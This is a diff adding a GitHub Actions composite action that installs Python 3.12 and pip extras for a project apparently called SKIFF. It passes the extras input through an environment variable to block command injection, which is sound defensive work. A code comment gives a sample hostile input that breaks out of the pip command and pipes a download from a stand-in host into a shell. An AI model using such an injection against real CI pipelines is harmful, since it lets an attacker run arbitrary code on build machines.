@@ -1,0 +1,37 @@
+name: Setup SKIFF Python
+description: >-
+  Checkout the repo, install Python 3.12, cache pip, and install the
+  dev extras. Shared by ci.yml / security.yml / future e2e.yml so the
+  setup block doesn't drift between workflows.
+
+inputs:
+  python-version:
+    description: Python version to install (default 3.12).
+    required: false
+    default: "3.12"
+  install-extras:
+    description: Pip extras to install (default dev).
+    required: false
+    default: "dev"
+
+runs:
+  using: composite
+  steps:
+    - name: Set up Python ${{ inputs.python-version }}
+      uses: actions/setup-python@a309ff8b426b58ec0e2a45f0f869d46889d02405  # v6
+      with:
+        python-version: ${{ inputs.python-version }}
+        cache: pip
+
+    - name: Install dependencies
+      shell: bash
+      # Pass `install-extras` via env instead of direct `${{ }}`
+      # interpolation into the run script. The value becomes a bash
+      # variable `${SKIFF_EXTRAS}` that cannot break out of the
+      # `pip install -e ".[...]"` invocation even if a future caller
+      # passes a hostile value (e.g. `dev]"; curl evil | sh; "`).
+      # Gated today by CODEOWNERS on .github/, but zero-trust says
+      # don't trust the caller even when the caller is yourself.
+      env:
+        SKIFF_EXTRAS: ${{ inputs.install-extras }}
+      run: pip install -e ".[${SKIFF_EXTRAS}]"
